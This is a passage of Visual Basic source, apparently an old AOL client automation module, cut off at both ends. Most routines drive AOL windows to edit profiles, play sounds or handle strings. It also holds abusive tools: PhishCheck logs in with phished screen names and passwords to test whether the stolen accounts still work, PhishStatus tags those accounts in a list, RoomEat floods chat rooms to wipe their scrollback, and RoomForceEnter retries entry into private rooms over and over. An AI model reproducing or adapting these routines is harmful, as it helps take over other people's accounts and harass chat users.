Shape.Line (0, 0)-(X - 10, Shape.Height), RGB(0, 0, 255), BF
Shape.CurrentX = (Shape.Width / 2) - 100
Shape.CurrentY = (Shape.Height / 2) - 125
Shape.ForeColor = RGB(255, 0, 0)
Shape.Print Percent(Done, Total&, 100) & "%"
End Sub
Public Function PhishCheck(ScreenName As String, Password As String, Optional SignOffIfTrue As Boolean = False) As Boolean
'checks to see if your phish are alive

If FindSignOnScreen& = 0& Then Exit Function
        Dim MessageOk As Long, OKButton As Long, AoModal As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoIcon1 As Long
        Dim AoIcon2 As Long, AoFrame As Long
Call GuestSetToGuest
Call GuestClickSignOn
Do: DoEvents
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoEdit1& = FindWindowEx(AoModal&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(AoModal&, AoEdit1&, "_AOL_Edit", vbNullString)
AoIcon2& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until AoModal& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0 And AoIcon2& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(AoEdit2&, WM_SETTEXT, 0&, Password$)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
If MessageOk& <> 0& Then
If GetMessageText(MessageOk&) = "Incorrect name and/or password, please re-enter" Then
PhishCheck = False
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
AoIcon2& = FindWindowEx(AoModal&, AoIcon2&, "_AOL_Icon", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Exit Function
ElseIf InStr(GetMessageText(MessageOk&), "suspended") <> 0& Then
PhishCheck = False
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
AoIcon2& = FindWindowEx(AoModal&, AoIcon2&, "_AOL_Icon", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Exit Function
ElseIf InStr(GetMessageText(MessageOk&), "Your account ") = 1& Then
PhishCheck = True
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
AoIcon2& = FindWindowEx(AoModal&, AoIcon2&, "_AOL_Icon", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Exit Function
End If
ElseIf FindWelcome& <> 0& Then
PhishCheck = True
If SignOffIfTrue = True Then Call RunMenuByString(AoFrame&, "&Sign Off")
Exit Function
End If
End Function
Public Sub PhishStatus(listbox As listbox, ListIndex As Long, Status As Long)
 'm=master,s=sub,?=dont know,h=overhead,i=
      'Status: 1 = "[m]", 2 = "[s]", 3 = "[?]", 4 = "[h]", 5 = "[i]"
If Status& = 1 Then
If InStr(listbox.List(ListIndex&), "[m]") <> 0& Then
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[s]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[s]", "[m]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[?]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[?]", "[m]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[h]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[h]", "[m]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[i]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[i]", "[m]")
Exit Sub
End If
ElseIf Status& = 2 Then
If InStr(listbox.List(ListIndex&), "[s]") <> 0& Then
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[m]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[m]", "[s]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[?]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[?]", "[s]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[h]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[h]", "[s]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[i]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[i]", "[s]")
Exit Sub
End If
ElseIf Status& = 3 Then
If InStr(listbox.List(ListIndex&), "[?]") <> 0& Then
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[m]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[m]", "[?]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[s]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[s]", "[?]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[h]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[h]", "[?]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[i]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[i]", "[?]")
Exit Sub
End If
ElseIf Status& = 4 Then
If InStr(listbox.List(ListIndex&), "[h]") <> 0& Then
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[m]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[m]", "[h]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[s]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[s]", "[h]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[?]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[?]", "[h]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[i]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[i]", "[h]")
Exit Sub
End If
ElseIf Status& = 5 Then
If InStr(listbox.List(ListIndex&), "[i]") <> 0& Then
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[m]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[m]", "[i]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[s]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[s]", "[i]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[?]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[?]", "[i]")
Exit Sub
ElseIf InStr(listbox.List(ListIndex&), "[h]") <> 0& Then
listbox.List(ListIndex&) = ReplaceCharacters(listbox.List(ListIndex&), "[h]", "[i]")
Exit Sub
End If
End If
End Sub
Public Sub PlayMidi(file As String)
'Plays mdi
        Dim MDI As String
MDI$ = Dir(file$)
If MDI$ <> "" Then
Call MciSendString("play " & file$, 0&, 0, 0)
End If
End Sub
Public Sub PlayWav(file As String)
'Plays a wav
        Dim WAV As String
WAV$ = Dir(file$)
If WAV$ <> "" Then
Call SndPlaySound(file$, SND_FLAG)
End If
End Sub
Public Sub PopUpIcon(IconNumber As Long, Character As String)
        Dim Message1 As Long, Message2 As Long, AoFrame As Long
        Dim AoToolbar As Long, Toolbar As Long, AoIcon As Long
        Dim NextOfClass As Long, AscCharacter As Long
Message1& = FindWindow("#32768", vbNullString)
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoToolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(AoToolbar, 0&, "_AOL_Toolbar", vbNullString)
AoIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
For NextOfClass& = 1 To IconNumber&
AoIcon& = GetWindow(AoIcon&, 2)
Next NextOfClass&
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
Message2& = FindWindow("#32768", vbNullString)
Loop Until Message2& <> Message1&
AscCharacter& = Asc(Character$)
Call PostMessage(Message2&, WM_CHAR, AscCharacter&, 0&)
End Sub
Public Sub PopUpIconDbl(IconNumber As Long, Character As String, Character2 As String)
        Dim Message1 As Long, Message2 As Long, AoFrame As Long
        Dim AoToolbar As Long, Toolbar As Long, AoIcon As Long
        Dim NextOfClass As Long, AscCharacter As Long, AscCharacter2 As Long
Message1& = FindWindow("#32768", vbNullString)
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoToolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(AoToolbar, 0&, "_AOL_Toolbar", vbNullString)
AoIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
For NextOfClass& = 1 To IconNumber&
AoIcon& = GetWindow(AoIcon&, 2)
Next NextOfClass&
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
Message2& = FindWindow("#32768", vbNullString)
Loop Until Message2& <> Message1&
AscCharacter& = Asc(Character$)
AscCharacter2& = Asc(Character2$)
Call PostMessage(Message2&, WM_CHAR, AscCharacter&, 0&)
Call PostMessage(Message2&, WM_CHAR, AscCharacter2&, 0&)
End Sub
Public Sub PrivateRoom(DaRoom As String)
'Goes to a private room
Call Keyword("aol://2719:2-2-" & DaRoom$)
End Sub
Public Sub ProfileEdit(Optional MemberName As String = "", Optional Location As String = "", Optional Birthday As String = "", Optional Gender As Integer = 0, Optional MaritalStatus As String = "", Optional Hobbies As String = "", Optional ComputersUsed As String = "", Optional Occupation As String = "", Optional PersonalQuote As String = "")
'Edits profile
        Dim MNEdit As Long, lEdit As Long, BEdit As Long
        Dim MSEdit As Long, HEdit As Long, MessageOk As Long
        Dim CUEdit As Long, OEdit As Long, PQEdit As Long, edit
        Dim NWatchModal As Long, ModalIcon As Long, ModalCheck As Long
        Dim ProfileWindow As Long, UpdateIcon As Long, OKButton As Long
        Dim MaleCheck As Long, FemaleCheck As Long, NoResponse As Long
ProfileWindow& = FindWindowEx(AolMDI&, 0&, "AOL Child", "Edit Your Online Profile")
If ProfileWindow& = 0& Then
Call PopUpIcon(5, "y")
ElseIf ProfileWindow& <> 0& Then
GoTo edit
End If
Do: DoEvents
ProfileWindow& = FindWindowEx(AolMDI&, 0&, "AOL Child", "Edit Your Online Profile")
MNEdit& = FindWindowEx(ProfileWindow&, 0&, "_AOL_Edit", vbNullString)
lEdit& = FindWindowEx(ProfileWindow&, MNEdit&, "_AOL_Edit", vbNullString)
BEdit& = FindWindowEx(ProfileWindow&, lEdit&, "_AOL_Edit", vbNullString)
MSEdit& = FindWindowEx(ProfileWindow&, BEdit&, "_AOL_Edit", vbNullString)
HEdit& = FindWindowEx(ProfileWindow&, MSEdit&, "_AOL_Edit", vbNullString)
CUEdit& = FindWindowEx(ProfileWindow&, HEdit&, "_AOL_Edit", vbNullString)
OEdit& = FindWindowEx(ProfileWindow&, CUEdit&, "_AOL_Edit", vbNullString)
PQEdit& = FindWindowEx(ProfileWindow&, OEdit&, "_AOL_Edit", vbNullString)
MaleCheck& = FindWindowEx(ProfileWindow&, 0&, "_AOL_Checkbox", vbNullString)
FemaleCheck& = FindWindowEx(ProfileWindow&, MaleCheck&, "_AOL_Checkbox", vbNullString)
NoResponse& = FindWindowEx(ProfileWindow&, FemaleCheck&, "_AOL_Checkbox", vbNullString)
UpdateIcon& = FindWindowEx(ProfileWindow&, 0&, "_AOL_Icon", vbNullString)
Loop Until ProfileWindow& <> 0& And MNEdit& <> 0& And lEdit& <> 0& And BEdit& <> 0& And MSEdit& <> 0& And HEdit& <> 0& And CUEdit& <> 0& And OEdit& <> 0&
Pause 1
NWatchModal& = FindWindow("_AOL_Modal", vbNullString)
ModalIcon& = FindWindowEx(NWatchModal&, 0&, "_AOL_Icon", vbNullString)
ModalCheck& = FindWindowEx(NWatchModal&, 0&, "_AOL_Checkbox", vbNullString)
If NWatchModal& <> 0& And ModalIcon& <> 0& And ModalCheck& <> 0& Then
Call ClickIcon(ModalCheck&)
Call ClickIcon(ModalIcon&)
Pause 1
GoTo edit
Else
GoTo edit
End If
edit:
If Val(Gender%) > 3 Or Val(Gender%) = 0 Then Gender% = 3
If Val(Gender%) < 1 And Val(Gender%) <> 0 Then Gender% = 1
MNEdit& = FindWindowEx(ProfileWindow&, 0&, "_AOL_Edit", vbNullString)
lEdit& = FindWindowEx(ProfileWindow&, MNEdit&, "_AOL_Edit", vbNullString)
BEdit& = FindWindowEx(ProfileWindow&, lEdit&, "_AOL_Edit", vbNullString)
MSEdit& = FindWindowEx(ProfileWindow&, BEdit&, "_AOL_Edit", vbNullString)
HEdit& = FindWindowEx(ProfileWindow&, MSEdit&, "_AOL_Edit", vbNullString)
CUEdit& = FindWindowEx(ProfileWindow&, HEdit&, "_AOL_Edit", vbNullString)
OEdit& = FindWindowEx(ProfileWindow&, CUEdit&, "_AOL_Edit", vbNullString)
PQEdit& = FindWindowEx(ProfileWindow&, OEdit&, "_AOL_Edit", vbNullString)
MaleCheck& = FindWindowEx(ProfileWindow&, 0&, "_AOL_Checkbox", vbNullString)
FemaleCheck& = FindWindowEx(ProfileWindow&, MaleCheck&, "_AOL_Checkbox", vbNullString)
NoResponse& = FindWindowEx(ProfileWindow&, FemaleCheck&, "_AOL_Checkbox", vbNullString)
UpdateIcon& = FindWindowEx(ProfileWindow&, 0&, "_AOL_Icon", vbNullString)
If MemberName$ <> "" Then
Call SetText(MNEdit&, MemberName$)
Else
Call SetText(MNEdit&, GetText(MNEdit&))
End If
If Location$ <> "" Then
Call SetText(lEdit&, Location$)
Else
Call SetText(lEdit&, GetText(lEdit&))
End If
If Birthday$ <> "" Then
Call SetText(BEdit&, Birthday$)
Else
Call SetText(BEdit&, GetText(BEdit&))
End If
If Gender% = 1 Then Call ClickIcon(MaleCheck&)
If Gender% = 2 Then Call ClickIcon(FemaleCheck&)
If Gender% = 3 Then Call ClickIcon(NoResponse&)
If MaritalStatus$ <> "" Then
Call SetText(MSEdit&, MaritalStatus$)
Else
Call SetText(MSEdit&, GetText(MSEdit&))
End If
If Hobbies$ <> "" Then
Call SetText(HEdit&, Hobbies$)
Else
Call SetText(HEdit&, GetText(HEdit&))
End If
If ComputersUsed$ <> "" Then
Call SetText(CUEdit&, ComputersUsed$)
Else
Call SetText(CUEdit&, GetText(CUEdit&))
End If
If Occupation$ <> "" Then
Call SetText(OEdit&, Occupation$)
Else
Call SetText(OEdit&, GetText(OEdit&))
End If
If PersonalQuote$ <> "" Then
Call SetText(PQEdit&, PersonalQuote$)
Else
Call SetText(PQEdit&, GetText(PQEdit&))
End If
Call ClickIcon(UpdateIcon&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Exit Sub
End If
End Sub
Public Sub ProfileDelete()
'Deletes a profile
        Dim MessageOk As Long, DeleteModal As Long, DeleteMIcon As Long
        Dim Delete
        Dim NWatchModal As Long, ModalIcon As Long, ModalCheck As Long
        Dim ProfileWindow As Long, DeleteIcon As Long, OKButton As Long
ProfileWindow& = FindWindowEx(AolMDI&, 0&, "AOL Child", "Edit Your Online Profile")
If ProfileWindow& = 0& Then
Call PopUpIcon(5, "y")
ElseIf ProfileWindow& <> 0& Then
GoTo Delete
End If
Do: DoEvents
ProfileWindow& = FindWindowEx(AolMDI&, 0&, "AOL Child", "Edit Your Online Profile")
DeleteIcon& = NextOfClassByCount(ProfileWindow&, "_AOL_Icon", 2)
Loop Until ProfileWindow& <> 0& And DeleteIcon& <> 0&
Pause 1
NWatchModal& = FindWindow("_AOL_Modal", vbNullString)
ModalIcon& = FindWindowEx(NWatchModal&, 0&, "_AOL_Icon", vbNullString)
ModalCheck& = FindWindowEx(NWatchModal&, 0&, "_AOL_Checkbox", vbNullString)
If NWatchModal& <> 0& And ModalIcon& <> 0& And ModalCheck& <> 0& Then
Call ClickIcon(ModalIcon&)
Pause 1
GoTo Delete
Else
GoTo Delete
  End If
Delete:
    DeleteIcon& = NextOfClassByCount(ProfileWindow&, "_AOL_Icon", 2)
    Call ClickIcon(DeleteIcon&)
    Do: DoEvents
        DeleteModal& = FindWindow("_AOL_Modal", vbNullString)
        DeleteMIcon& = NextOfClassByCount(DeleteModal&, "_AOL_Icon", 2)
        MessageOk& = FindWindow("#32770", "America Online")
        OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
    Loop Until DeleteModal& <> 0& And DeleteMIcon& <> 0& Or MessageOk& <> 0& And OKButton& <> 0&
    If DeleteModal& <> 0& And DeleteMIcon& <> 0& Then
        Call ClickIcon(DeleteMIcon&)
        Do: DoEvents
            MessageOk& = FindWindow("#32770", "America Online")
            OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
        Loop Until MessageOk& <> 0& And OKButton& <> 0&
        Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Exit Sub
       ElseIf DeleteModal& = 0& And DeleteMIcon& = 0& Then
        Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call WinClose(ProfileWindow&)
        Exit Sub
    End If
End Sub

Public Function ProfileGet(Person As String) As String
'Gets a profile
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim GetProfileWindow As Long, AoEdit As Long, GetProfileWin As Long
        Dim AoView As Long, message As Long, Button As Long
        Dim Static1 As Long, Static2 As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
Call PopUpIcon(9, "G")
Do: DoEvents
GetProfileWin& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Get a Member's Profile")
AoEdit& = FindWindowEx(GetProfileWin&, 0&, "_AOL_Edit", vbNullString)
Loop Until GetProfileWin& <> 7 And AoEdit& <> 0&
Call SendMessageByString(AoEdit&, WM_SETTEXT, 0&, Person$)
Call SendMessageLong(AoEdit&, WM_CHAR, VK_SPACE, 0&)
Call SendMessageLong(AoEdit&, WM_CHAR, VK_RETURN, 0&)
Do: DoEvents
GetProfileWin& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Member Profile")
message& = FindWindow("#32770", "America Online")
AoView& = FindWindowEx(GetProfileWin&, 0&, "_AOL_View", vbNullString)
Loop Until GetProfileWin& <> 0& And AoView& <> 0& Or message& <> 0&
If GetProfileWin& <> 0& Then
Call Pause(3)
If GetText(AoView&) = "" Then
ProfileGet$ = Person$ & "' s profile is blank."
Call PostMessage(GetProfileWin&, WM_CLOSE, 0&, 0&)
Call PostMessage(GetProfileWin&, WM_CLOSE, 0&, 0&)
Exit Function
ElseIf GetText(AoView&) <> "" Then
ProfileGet$ = GetText(AoView&)
Call PostMessage(GetProfileWin&, WM_CLOSE, 0&, 0&)
Call PostMessage(GetProfileWin&, WM_CLOSE, 0&, 0&)
Exit Function
End If
Else
Static1& = FindWindowEx(message&, 0&, "Static", vbNullString)
Static2& = FindWindowEx(message&, Static1&, "Static", vbNullString)
Button& = FindWindowEx(message&, 0&, "Button", vbNullString)
ProfileGet$ = GetText(Static2&)
Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(GetProfileWin&, WM_CLOSE, 0&, 0&)
Exit Function
End If
End Function
Public Function ProfileTrim(profile As String) As String
'Gets rid of certian chr's
        Dim PrepString As String
PrepString$ = ReplaceCharacters(profile$, "'", "")
PrepString$ = ReplaceCharacters(PrepString$, "~", "")
PrepString$ = ReplaceCharacters(PrepString$, "`", "")
PrepString$ = ReplaceCharacters(PrepString$, "!", "")
PrepString$ = ReplaceCharacters(PrepString$, "@", "")
PrepString$ = ReplaceCharacters(PrepString$, "#", "")
PrepString$ = ReplaceCharacters(PrepString$, "$", "")
PrepString$ = ReplaceCharacters(PrepString$, "%", "")
PrepString$ = ReplaceCharacters(PrepString$, "^", "")
PrepString$ = ReplaceCharacters(PrepString$, "&", "")
PrepString$ = ReplaceCharacters(PrepString$, "*", "")
PrepString$ = ReplaceCharacters(PrepString$, "(", "")
PrepString$ = ReplaceCharacters(PrepString$, ")", "")
PrepString$ = ReplaceCharacters(PrepString$, "_", "")
PrepString$ = ReplaceCharacters(PrepString$, "-", "")
PrepString$ = ReplaceCharacters(PrepString$, "+", "")
PrepString$ = ReplaceCharacters(PrepString$, "=", "")
PrepString$ = ReplaceCharacters(PrepString$, "]", "")
PrepString$ = ReplaceCharacters(PrepString$, "[", "")
PrepString$ = ReplaceCharacters(PrepString$, "}", "")
PrepString$ = ReplaceCharacters(PrepString$, "{", "")
PrepString$ = ReplaceCharacters(PrepString$, Chr(34), "")
PrepString$ = ReplaceCharacters(PrepString$, "|", "")
PrepString$ = ReplaceCharacters(PrepString$, "\", "")
PrepString$ = ReplaceCharacters(PrepString$, ":", "")
PrepString$ = ReplaceCharacters(PrepString$, ";", "")
PrepString$ = ReplaceCharacters(PrepString$, "?", "")
PrepString$ = ReplaceCharacters(PrepString$, "/", "")
PrepString$ = ReplaceCharacters(PrepString$, ">", "")
PrepString$ = ReplaceCharacters(PrepString$, ".", "")
PrepString$ = ReplaceCharacters(PrepString$, "<", "")
PrepString$ = ReplaceCharacters(PrepString$, ",", "")
ProfileTrim$ = PrepString$
End Function
Public Function RandomLetter() As String
'Makes a random letter
        Dim Random As Long
Randomize
Random& = Int(Rnd * 26) + 1
RandomLetter$ = Chr(Random& + 96)
End Function
Public Function RandomNumber(MaxNumber As Long) As Long
'Makes a random number
Call Randomize
RandomNumber& = Int((Val(MaxNumber&) * Rnd) + 1)
End Function
Public Function ReplaceString(MyString As String, WhatToFind As String, ReplaceWith As String) As String
        Dim Place1 As Long, NewPlace As Long, LeftString As String
        Dim RightString As String, NewString As String
Place1& = InStr(LCase(MyString$), LCase(WhatToFind))
NewPlace& = Place1&
Do
If NewPlace& > 0& Then
LeftString$ = Left(MyString$, NewPlace& - 1)
If Place1& + Len(WhatToFind$) <= Len(MyString$) Then
RightString$ = Right(MyString$, Len(MyString$) - NewPlace& - Len(WhatToFind$) + 1)
Else
RightString = ""
End If
NewString$ = LeftString$ & ReplaceWith$ & RightString$
MyString$ = NewString$
Else
NewString$ = MyString$
End If
Place1& = NewPlace& + Len(ReplaceWith$)
If Place1& > 0 Then
NewPlace& = InStr(Place1&, LCase(MyString$), LCase(WhatToFind$))
End If
Loop Until NewPlace& < 1
ReplaceString$ = NewString$
End Function
Public Function ReverseString(TxtToReverse As String) As String
        Dim Step As Long, NewString As String
For Step& = 1 To Len(TxtToReverse$)
NewString$ = Mid(TxtToReverse$, Step&, 1) & NewString$
Next Step&
ReverseString$ = NewString$
End Function
Public Function RgbToBodyColor(RedValue As Long, GreenValue As Long, BlueValue As Long) As String
RgbToBodyColor$ = "<Body BgColor=#" & Hex(RGB(RedValue&, GreenValue&, BlueValue&)) & ">"
End Function
Public Function RgbToFontColor(RedValue As Long, GreenValue As Long, BlueValue As Long) As String
RgbToFontColor$ = "<Font Color=#" & Hex(RGB(RedValue&, GreenValue&, BlueValue&)) & ">"
End Function
Public Function RGBtoHEX(RGB As Long) As String
    Dim HexVal As String, LenHexVal As Long
HexVal$ = Hex(RGB&)
LenHexVal& = Len(HexVal$)
If LenHexVal& = 1 Then HexVal$ = "00000" & HexVal$
If LenHexVal& = 2 Then HexVal$ = "0000" & HexVal$
If LenHexVal& = 3 Then HexVal$ = "000" & HexVal$
If LenHexVal& = 4 Then HexVal$ = "00" & HexVal$
If LenHexVal& = 5 Then HexVal$ = "0" & HexVal$
RGBtoHEX$ = "#" & HexVal$
End Function

Public Function RoomCount() As Long
If FindRoom& = 0& Then Exit Function
        Dim AoList As Long
AoList& = FindWindowEx(FindRoom&, 0&, "_AOL_Listbox", vbNullString)
RoomCount& = ListCount(AoList&)
End Function
Public Function ReplaceCharacters(MainString As String, LookFor As String, ReplaceWith As String) As String
        Dim NewMain As String, Instance As Long
NewMain$ = MainString$
Do While InStr(1, NewMain$, LookFor$)
DoEvents
Instance& = InStr(1, NewMain$, LookFor$)
NewMain$ = Left(NewMain$, (Instance& - 1)) & ReplaceWith$ & Right(NewMain$, Len(NewMain$) - (Instance& + Len(LookFor$) - 1))
Loop
ReplaceCharacters$ = NewMain$
End Function
Public Sub RoomClear()
If FindRoom& = 0& Then Exit Sub
        Dim RichText As Long
RichText& = FindWindowEx(FindRoom&, 0&, "RICHCNTL", vbNullString)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, "")
End Sub
Public Sub RoomEnterAny(RoomName As String)
        Dim Invite As Long, AoIcon As Long
Call BuddyInvitation(usersn, "wgf", RoomName$, "Room")
Do: DoEvents
Invite& = FindChildByTitleEx(AolMDI&, "Invitation From: " & usersn)
AoIcon& = FindChildByClass(Invite&, "_AOL_Icon")
Loop Until Invite& <> 0& And AoIcon& <> 0&
Call ClickIcon(AoIcon&)
End Sub
Sub RoomEat()
'eats the chat so you cant scroll back up
        Dim i As Long, A As String, b As String
        Dim y As Long
For i& = 1& To 1900
A$ = A$ + ""
Next
For y& = 1 To 1900
b$ = b$ + " "
Next
RoomSend (".<p=" & A$)
TimeOut 0.6
RoomSend (".<p=" & A$)
TimeOut 0.6
RoomSend (".<p=" & A$)
TimeOut 0.6
RoomSend (".<p=" & b$)
Pause (0.4)
RoomSend ("Burp!" & usersn & "I ate the chat!")
End Sub

Public Function RoomForceEnter(AoKeyWord As String, PrivateRoom As String, Optional CloseChatBeforeBust As Boolean = True, Optional Delay As Single = ".5", Optional StopAfterSoManyTries As Long = "100") As Long
        Dim MessageOk As Long, OKButton As Long, GetRoomName As String
If CloseChatBeforeBust = True Then
If FindRoom& <> 0& Then Call PostMessage(FindRoom&, WM_CLOSE, 0&, 0&)
RoomForceEnter& = 0&
Do: DoEvents
Call Keyword(AoKeyWord$ & PrivateRoom$)
RoomForceEnter& = RoomForceEnter& + 1
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindRoom& <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
End If
Pause Val(Delay)
If RoomForceEnter& >= StopAfterSoManyTries& Then Exit Do
Loop Until FindRoom& <> 0&
Exit Function
ElseIf CloseChatBeforeBust = False Then
If FindRoom& <> 0& Then
GetRoomName$ = LCase(TrimSpaces(RoomName$))
Do: DoEvents
Call Keyword(AoKeyWord$ & PrivateRoom$)
RoomForceEnter& = RoomForceEnter& + 1
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or InStr(LCase(TrimSpaces(RoomName$)), LCase(TrimSpaces(PrivateRoom$))) <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
End If
Pause Val(Delay)
If RoomForceEnter& >= StopAfterSoManyTries& Then Exit Do
Loop Until InStr(LCase(TrimSpaces(RoomName$)), LCase(TrimSpaces(PrivateRoom$))) <> 0&
Exit Function
ElseIf FindRoom& = 0& Then
Do: DoEvents
Call Keyword(AoKeyWord$ & PrivateRoom$)
RoomForceEnter& = RoomForceEnter& + 1
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindRoom& <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
